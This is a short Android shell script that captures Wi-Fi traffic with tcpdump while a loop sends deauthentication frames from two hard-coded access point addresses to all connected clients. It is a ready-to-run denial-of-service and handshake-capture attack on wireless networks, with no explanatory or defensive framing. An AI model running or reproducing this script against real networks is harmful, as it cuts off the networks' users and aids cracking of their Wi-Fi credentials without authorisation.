#!/system/bin/sh
DUR=90
rm -f /data/local/tmp/capG.pcap
timeout $DUR tcpdump -i wlan0 -s 0 -w /data/local/tmp/capG.pcap >/dev/null 2>&1 &
TPID=$!
sleep 2
END=$(( $(date +%s) + $DUR ))
while [ $(date +%s) -lt $END ]; do
  /data/local/tmp/deauth wlan0 bc3e0701dc92 ffffffffffff 4 25 2>/dev/null
  /data/local/tmp/deauth wlan0 bc3e0701dc98 ffffffffffff 4 25 2>/dev/null
done
wait $TPID 2>/dev/null
wc -c /data/local/tmp/capG.pcap
echo CAPG_DONE
